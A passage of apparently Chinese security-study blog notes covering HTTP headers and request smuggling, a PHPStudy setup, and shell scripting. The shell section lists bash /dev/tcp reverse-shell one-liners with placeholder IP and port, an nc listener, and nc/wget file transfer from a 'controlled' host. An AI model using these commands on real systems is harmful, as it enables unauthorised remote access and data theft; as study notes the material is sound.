align="left">TRACE</td><td align="left">回显服务器收到的请求，主要用于测试或诊断。</td></tr><tr><td align="left">9</td><td align="left">PATCH</td><td align="left">是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td></tr></tbody></table><p>虽然 HTTP 的请求方式有 8 种，但是我们在实际应用中常用的也就是 <strong>get</strong> 和 <strong>post</strong>，其他请求方式也都可以通过这两种方式间接的来实现。</p></blockquote><p>头部字段：</p><blockquote><p>Host：客户端发送请求时，用来指定服务器的域名。有了 <code>Host</code> 字段，就可以将请求发往「同一台」服务器上的不同网站。</p><p>User-Agent字段：用户使用的客户端的一些必要信息，如操作系统、浏览器以及版本、浏览器渲染引擎等。</p><p>X-forwarded-for：代表请求端的IP有多个，中间逗号隔开。</p><p>Client-IP：同上</p><p>Referer字段：该请求报文从哪个URL地址发送。</p><p>Connection 字段：<code>Connection</code> 字段最常用于客户端要求服务器使用 TCP 持久连接，以便其他请求复用。HTTP/1.1 版本的默认连接都是持久连接，但为了兼容老版本的 HTTP，需要指定 <code>Connection</code> 首部字段的值为 <code>Keep-Alive</code>。一个可以复用的 TCP 连接就建立了，直到客户端或服务器主动关闭连接。但是，这不是标准字段。</p><p>Accept字段：客户端请求的时候，可以使用 <code>Accept</code> 字段声明自己可以接受哪些数据格式。</p><p>Accept-Encoding字段：客户端在请求时，用 <code>Accept-Encoding</code> 字段说明自己可以接受哪些压缩方法。</p><p>Cookie字段：缓存数据。用户身份会话令牌，用于服务器标识客户端身份。</p><p>Content-Type：上传文件的MIME类型。</p><p>Destination：目标资源位置</p></blockquote><h3 id="五、Http响应报文"><a href="#五、Http响应报文" class="headerlink" title="五、Http响应报文"></a>五、Http响应报文</h3><p><a href="https://imgchr.com/i/akyvXq"><img src="https://s1.ax1x.com/2020/07/28/akyvXq.png" alt="akyvXq.png"></a></p><p>头部字段：</p><blockquote><p>Server 字段：服务器类型。</p><p>Content-Length 字段：服务器在返回数据时，会有 <code>Content-Length</code> 字段，表明本次回应的数据长度。</p><p>Connection 字段：<code>Connection</code> 字段最常用于客户端要求服务器使用 TCP 持久连接，以便其他请求复用。HTTP/1.1 版本的默认连接都是持久连接，但为了兼容老版本的 HTTP，需要指定 <code>Connection</code> 首部字段的值为 <code>Keep-Alive</code>。一个可以复用的 TCP 连接就建立了，直到客户端或服务器主动关闭连接。但是，这不是标准字段。</p><p>Content-Type 字段：<code>Content-Type</code> 字段用于服务器回应时，告诉客户端，本次数据是什么格式。</p><p>Content-Encoding 字段：<code>Content-Encoding</code> 字段说明数据的压缩方法。表示服务器返回的数据使用了什么压缩格式</p><p>Keep-Alive字段：表明保持连接状态的时间等信息。</p><p>Set-Cookie字段：服务器返回缓存在客户端中的Cookie</p><p>Location：标识客户应该去哪提取文档</p></blockquote><h3 id="六、Http响应报文字段Content-type详解"><a href="#六、Http响应报文字段Content-type详解" class="headerlink" title="六、Http响应报文字段Content-type详解"></a>六、Http响应报文字段Content-type详解</h3><p>Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=something</span><br></pre></td></tr></table></figure><p>常见的媒体格式类型如下：</p><ul><li>text/html ： HTML格式</li><li>text/plain ：纯文本格式</li><li>text/xml ： XML格式</li><li>image/gif ：gif图片格式</li><li>image/jpeg ：jpg图片格式</li><li>image/png：png图片格式</li></ul><p>以application开头的媒体格式类型：</p><ul><li>application/xhtml+xml ：XHTML格式</li><li>application/xml： XML数据格式</li><li>application/atom+xml ：Atom XML聚合格式</li><li>application/json： JSON数据格式</li><li>application/pdf：pdf格式</li><li>application/msword ： Word文档格式</li><li>application/octet-stream ： 二进制流数据（如常见的文件下载）</li><li>application/x-www-form-urlencoded ： <form encType=””>中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）</li></ul><p>另外一种常见的媒体格式是上传文件之时使用的：</p><ul><li>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</li></ul><h3 id="七、Http常见的状态码"><a href="#七、Http常见的状态码" class="headerlink" title="七、Http常见的状态码"></a>七、Http常见的状态码</h3><p><a href="https://imgchr.com/i/aiHc7j"><img src="https://s1.ax1x.com/2020/07/27/aiHc7j.png" alt="aiHc7j.png"></a></p><p><img src="C:\Users\18265\AppData\Roaming\Typora\typora-user-images\image-20200820162112400.png" alt="image-20200820162112400"></p><h3 id="八、实验：利用Cmd的telnet构造请求报文，向百度发送get请求"><a href="#八、实验：利用Cmd的telnet构造请求报文，向百度发送get请求" class="headerlink" title="八、实验：利用Cmd的telnet构造请求报文，向百度发送get请求"></a>八、实验：利用Cmd的telnet构造请求报文，向百度发送get请求</h3><p>1、<code>telnet www.baidu.com 80</code></p><p>2、按下<code>Ctrl + ]</code></p><p>3、回车</p><p>4、输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line">Host:www.baidu.com</span><br></pre></td></tr></table></figure><p>5、成功获得http响应报文</p><h3 id="九、HTTP请求走私"><a href="#九、HTTP请求走私" class="headerlink" title="九、HTTP请求走私"></a>九、HTTP请求走私</h3><p><a href="https://xz.aliyun.com/t/6631">https://xz.aliyun.com/t/6631</a></p><h4 id="1、产生原因"><a href="#1、产生原因" class="headerlink" title="1、产生原因"></a>1、<strong>产生原因</strong></h4><p>为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构<br> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20191024193343-221e0d56-f652-1.jpg"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191024193343-221e0d56-f652-1.jpg" alt="img"></a><br> 反向代理服务器与后端的源站服务器之间，会重用TCP链接，因为代理服务器与后端的源站服务器的IP地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，所以就顺理成章了</p><p>但是由于两者服务器的实现方式不同，如果用户提交模糊的请求可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分就是走私的请求了，这就是HTTP走私请求的由来。</p><p>HTTP请求走私漏洞的原因是由于HTTP规范提供了两种不同方式来指定请求的结束位置，它们是<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头，<code>Content-Length</code>标头简单明了，它以字节为单位指定消息内容体的长度，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko&#x2F;20100101 Firefox&#x2F;48.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Cookie: session&#x3D;5n2xRNXtAYM9teOEn3jSkEDDabLe0Qv8</span><br><span class="line">Content-Length: 35</span><br><span class="line">a&#x3D;11</span><br></pre></td></tr></table></figure><p><code>Transfer-Encoding</code>标头用于指定消息体使用分块编码（Chunked  Encode），也就是说消息报文由一个或多个数据块组成，每个数据块大小以字节为单位（十六进制表示）  衡量，后跟换行符，然后是块内容，最重要的是：整个消息体以大小为0的块结束，也就是说解析遇到0数据块就结束。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">b</span><br><span class="line"></span><br><span class="line">a&#x3D;11</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>其实理解起来真的很简单，相当于我发送请求，包含<code>Content-Length</code>，前端服务器解析后没有问题发送给后端服务器，但是我在请求时后面还包含了<code>Transfer-Encoding</code>，这样后端服务器进行解析便可执行我写在下面的一些命令，这样便可以绕过前端的waf。</p><h4 id="2、四种常见走私请求"><a href="#2、四种常见走私请求" class="headerlink" title="2、四种常见走私请求"></a>2、<strong>四种常见走私请求</strong></h4><h5 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a><strong>CL不为0的GET请求</strong></h5><p>假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><h5 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a><strong>CL-CL</strong></h5><p>假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理,这样便有可能引发请求走私。</p><h5 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a><strong>CL-TE</strong></h5><p>所谓CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length这一请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding这一请求头。</p><h5 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a><strong>TE-CL</strong></h5><p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1、部署实验WAMP环境——PHPStudy</title>
      <link href="/2020/07/27/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/1%E3%80%81%E9%83%A8%E7%BD%B2%E5%AE%9E%E9%AA%8CWAMP%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94PHPStudy/"/>
      <url>/2020/07/27/%E9%98%B6%E6%AE%B5%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%89%E5%85%A8/1%E3%80%81%E9%83%A8%E7%BD%B2%E5%AE%9E%E9%AA%8CWAMP%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94PHPStudy/</url>
      
        <content type="html"><![CDATA[<h2 id="部署实验WAMP环境——PHPStudy"><a href="#部署实验WAMP环境——PHPStudy" class="headerlink" title="部署实验WAMP环境——PHPStudy"></a>部署实验WAMP环境——PHPStudy</h2><h3 id="一、Windows2008部署经典Web服务器架构WAMP"><a href="#一、Windows2008部署经典Web服务器架构WAMP" class="headerlink" title="一、Windows2008部署经典Web服务器架构WAMP"></a>一、Windows2008部署经典Web服务器架构WAMP</h3><blockquote><p>使用环境部署框架软件：<strong>PHPStudy</strong>2016版本 （集成环境</p></blockquote><p>1、安装PhpStudy，安装后发现Apache服务无法开启，原因是缺少VC9运行库，安装X86的VC9运行库后成功开启Apache、PHP服务。访问<code>127.0.0.1</code>本地web服务，发现PHPStudy探针，说明环境搭建完成。</p><p>2、使用PHPStudy探针网页下方自带的mysql客户端尝试连接本地Mysql服务，用户名密码都是root。</p><h3 id="二、Apache服务器目录分析"><a href="#二、Apache服务器目录分析" class="headerlink" title="二、Apache服务器目录分析"></a>二、Apache服务器目录分析</h3><h4 id="1、Web根目录分析"><a href="#1、Web根目录分析" class="headerlink" title="1、Web根目录分析"></a>1、Web根目录分析</h4><blockquote><p>phpStudy\WWW</p></blockquote><p>1）探针网页：l.php</p><p>2）PHPinfo页面：phpinfo.php</p><p>3）phpmyadmin页面：基于php的MysqlWeb客户端</p><h4 id="2、Apache配置文件分析"><a href="#2、Apache配置文件分析" class="headerlink" title="2、Apache配置文件分析"></a>2、Apache配置文件分析</h4><blockquote><p>phpStudy/Apache/httpd.conf</p></blockquote><p>分析Apache配置文件httpd.conf，<code>Document root</code>是网站主页的文件夹路径</p><h3 id="3、Apache日志文件"><a href="#3、Apache日志文件" class="headerlink" title="3、Apache日志文件"></a>3、Apache日志文件</h3><blockquote><p>phpStudy/Apache/logs/</p></blockquote><h3 id="三、Mysql服务目录分析"><a href="#三、Mysql服务目录分析" class="headerlink" title="三、Mysql服务目录分析"></a>三、Mysql服务目录分析</h3><h4 id="1、Mysql启动命令"><a href="#1、Mysql启动命令" class="headerlink" title="1、Mysql启动命令"></a>1、Mysql启动命令</h4><blockquote><p>phpStudy/MySQL/bin #将此目录加入环境变量，方便命令行控制</p></blockquote><h4 id="2、Mysql配置文件"><a href="#2、Mysql配置文件" class="headerlink" title="2、Mysql配置文件"></a>2、Mysql配置文件</h4><blockquote><p>phpStudy/MySQL/my.ini</p></blockquote><h3 id="四、PHP目录分析"><a href="#四、PHP目录分析" class="headerlink" title="四、PHP目录分析"></a>四、PHP目录分析</h3><h4 id="1、PHP探针：phpinfo"><a href="#1、PHP探针：phpinfo" class="headerlink" title="1、PHP探针：phpinfo()"></a>1、PHP探针：<code>phpinfo()</code></h4><h4 id="2、PHP配置文件"><a href="#2、PHP配置文件" class="headerlink" title="2、PHP配置文件"></a>2、PHP配置文件</h4><blockquote><p>phpStudy/php/php你的版本/php.ini</p></blockquote><p>分析PHP文件夹，需要注意PHPStudy软件上提示的PHP版本，去对应版本的PHP问价夹中的php.ini配置文件进行配置</p><h4 id="3、PHP启动路径"><a href="#3、PHP启动路径" class="headerlink" title="3、PHP启动路径"></a>3、PHP启动路径</h4><blockquote><p>phpStudy/php/php你的版本    #将此目录加入环境变量，方便命令行控制</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码审计安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>12、Shell脚本</title>
      <link href="/2020/07/26/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/12%E3%80%81Shell%E8%84%9A%E6%9C%AC/"/>
      <url>/2020/07/26/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/12%E3%80%81Shell%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="Shell脚本"><a href="#Shell脚本" class="headerlink" title="Shell脚本"></a>Shell脚本</h2><h3 id="一、什么是脚本？"><a href="#一、什么是脚本？" class="headerlink" title="一、什么是脚本？"></a>一、什么是脚本？</h3><p>与.bat批处理文件是一种类型的文件。脚本编程语言一般是一种解释性的语言。脚本语言主要用于简化计算机相关人员对于一些反复性操作的重复执行，将这些反复性操作的代码写到一个文件中，每次只需要运行这个文件就可以减少很多的工作量。</p><h3 id="二、shell脚本编写格式"><a href="#二、shell脚本编写格式" class="headerlink" title="二、shell脚本编写格式"></a>二、shell脚本编写格式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1：#!&#x2F;bin&#x2F;bash    #声明该脚本使用的命令解释器</span><br><span class="line">2：#filename:文件名    </span><br><span class="line">3：#脚本注释</span><br><span class="line">4：by athors ...</span><br></pre></td></tr></table></figure><h3 id="三、shell的变量赋值"><a href="#三、shell的变量赋值" class="headerlink" title="三、shell的变量赋值"></a>三、shell的变量赋值</h3><p>从标准输入接受变量复制：<code>read -p &quot;提示语句&quot; 变量名</code></p><h3 id="四、shell的if判断语句"><a href="#四、shell的if判断语句" class="headerlink" title="四、shell的if判断语句"></a>四、shell的if判断语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if condition1        #&#96;表达式&#96;可做condition，shell中0为真，非0为假</span><br><span class="line">then</span><br><span class="line">    command1</span><br><span class="line">elif condition2 </span><br><span class="line">then </span><br><span class="line">    command2</span><br><span class="line">else</span><br><span class="line">    commandN</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>大于：<code>-gt</code>、小于：<code>-lt</code>、等于：<code>-eq</code></p><h3 id="五、shell的for循环"><a href="#五、shell的for循环" class="headerlink" title="五、shell的for循环"></a>五、shell的for循环</h3><p>for循环根据<u>取值列表</u>循环。</p><p>生成取值列表：<code>&#123;1..100&#125;</code>    #生成1-100的取值列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for var in item1 item2 ... itemN(取值列表)</span><br><span class="line">do</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="六、shell的while循环"><a href="#六、shell的while循环" class="headerlink" title="六、shell的while循环"></a>六、shell的while循环</h3><p>while循环根据条件进行循环</p><p>echo字体颜色设置：<code>echo -e &quot;\e[1;33;41m 字符串 \e[0m&quot;</code></p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. \e 转义起始符，定义一个转义序列， 可以使用 \033代替</span><br><span class="line">2. [ 表示开始定义颜色</span><br><span class="line">3. 1表示高亮，33表示字体颜色为黄色，45表示背景色为红色</span><br><span class="line">4. “test content” 属于文字内容</span><br><span class="line">5. m 转义终止符，表示颜色定义完毕</span><br><span class="line">6. 再次使用 \e[ ，表示再次开启颜色定义，0表示使用默认的颜色，m表示颜色定义结束，所以 \e[0m 的作用是恢复之前的配色方案</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字体颜色：30——37</span><br><span class="line"></span><br><span class="line">默认&#x3D;0，黑色&#x3D;30，红色&#x3D;31，绿色&#x3D;32，黄色&#x3D;33，蓝色&#x3D;34，紫色&#x3D;35，天蓝色&#x3D;36，白色&#x3D;3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字背景颜色：40——47</span><br><span class="line"></span><br><span class="line">默认&#x3D;0，黑色&#x3D;40，红色&#x3D;41，绿色&#x3D;42，黄色&#x3D;43，蓝色&#x3D;44，紫色&#x3D;45，天蓝色&#x3D;46，白色&#x3D;47</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while condition</span><br><span class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="七、shell的case语句"><a href="#七、shell的case语句" class="headerlink" title="七、shell的case语句"></a>七、shell的case语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">case 值 in</span><br><span class="line">模式1)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    command3</span><br><span class="line">    ;;</span><br><span class="line">模式2）</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    command3</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    command3</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><h3 id="八、shell函数"><a href="#八、shell函数" class="headerlink" title="八、shell函数"></a>八、shell函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[ function ] funname [()]</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    action;</span><br><span class="line"></span><br><span class="line">    [return int;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li>1、可以带function fun() 定义，也可以直接fun() 定义,不带任何参数。</li><li>2、参数返回，可以显示加：return 返回，如果不加，将以最后一条命令运行结果，作为返回值。 return后跟数值n(0-255）</li><li>3、函数返回值在调用该函数后通过 $? 来获得。</li></ul></blockquote><table><thead><tr><th align="left">参数处理</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">$#</td><td align="left">传递到脚本或函数的参数个数</td></tr><tr><td align="left">$*</td><td align="left">以一个单字符串显示所有向脚本传递的参数</td></tr><tr><td align="left">$$</td><td align="left">脚本运行的当前进程ID号</td></tr><tr><td align="left">$!</td><td align="left">后台运行的最后一个进程的ID号</td></tr><tr><td align="left">$@</td><td align="left">与$*相同，但是使用时加引号，并在引号中返回每个参数。</td></tr><tr><td align="left">$-</td><td align="left">显示Shell使用的当前选项，与set命令功能相同。</td></tr><tr><td align="left">$?</td><td align="left">显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td></tr></tbody></table><blockquote><p>注意，$10 不能获取第十个参数，获取第十个参数需要${10}。当n&gt;=10时，需要使用${n}来获取参数。 </p></blockquote><h3 id="九、实验：编写一个nginx服务脚本，并交由chkconfig管理且实现开机自启动"><a href="#九、实验：编写一个nginx服务脚本，并交由chkconfig管理且实现开机自启动" class="headerlink" title="九、实验：编写一个nginx服务脚本，并交由chkconfig管理且实现开机自启动"></a>九、实验：编写一个nginx服务脚本，并交由chkconfig管理且实现开机自启动</h3><p>1、在/etc/rc.d/init.d下编写一个nginxd服务脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#filename: nginxd</span></span><br><span class="line"><span class="comment">#pwd: /etc/rc.d/init.d</span></span><br><span class="line"><span class="comment">#chkconfig: - 66 66        如果需要被chkconfig管理，必须加此注释</span></span><br><span class="line">nginx=/usr/<span class="built_in">local</span>/nginx/sbin/nginx</span><br><span class="line"><span class="function"><span class="title">start</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;nginx starting... [ \e[32mOK\e[0m ]&quot;</span></span><br><span class="line">    <span class="variable">$nginx</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">stop</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;ngnix stoping... [ \e[32mOK\e[0m ]&quot;</span></span><br><span class="line">    <span class="variable">$nginx</span> -s stop</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">reload</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;ngnix stoping... [ \e[32mOK\e[0m ]&quot;</span></span><br><span class="line">    <span class="variable">$nginx</span> -s reload</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">status</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> `ss -ntpl | grep nginx &amp;&gt; /dev/null`</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;ngnix starting... [ \e[32mstarting\e[0m ]&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;ngnix is stoped... [ \e[31mstoped\e[0m ]&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line">    start</span><br><span class="line">    ;;</span><br><span class="line">stop)</span><br><span class="line">    stop</span><br><span class="line">    ;;</span><br><span class="line">status)</span><br><span class="line">    status</span><br><span class="line">    ;;</span><br><span class="line">reload)</span><br><span class="line">    reload</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage <span class="variable">$0</span> &#123;start|stop|reload|status&#125;&quot;</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>2、测试chkconfig是否可以管理此脚本：<code>chkconfig --list nginxd</code></p><p>3、将该脚本加入到chkconfig管理列表：<code>chkconfig --add nginxd</code></p><p>4、设置该脚本在level5级，也就是系统以图形化界面运行启动时，开启此脚本：<code>chkconfig --level 5 nginxd on</code></p><h3 id="十、反弹Shell"><a href="#十、反弹Shell" class="headerlink" title="十、反弹Shell"></a>十、反弹Shell</h3><p><a href="https://www.anquanke.com/post/id/87017">https://www.anquanke.com/post/id/87017</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/IP/Port 0&gt;&amp;1&#x27;</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/IP/port 0&gt;&amp;1</span><br><span class="line">nc -lvvp Port</span><br></pre></td></tr></table></figure><h3 id="十一、在ssh会话中传输文件"><a href="#十一、在ssh会话中传输文件" class="headerlink" title="十一、在ssh会话中传输文件"></a>十一、在ssh会话中传输文件</h3><p>1、利用nc</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">受控方: nc 服务器IP 服务器端口 &lt; 源文件</span><br><span class="line">服务器方: nv -lvvp 端口 &gt; 目标文件</span><br></pre></td></tr></table></figure><p>2、利用php</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">受控方开启http服务: php -S 0.0.0.0:端口</span><br><span class="line">服务端通过服务下载文件:wget http://受控方IP:端口/文件名</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11、iptables——NAT表</title>
      <link href="/2020/07/26/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/11%E3%80%81iptables%E2%80%94%E2%80%94NAT%E8%A1%A8/"/>
      <url>/2020/07/26/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/11%E3%80%81iptables%E2%80%94%E2%80%94NAT%E8%A1%A8/</url>
      
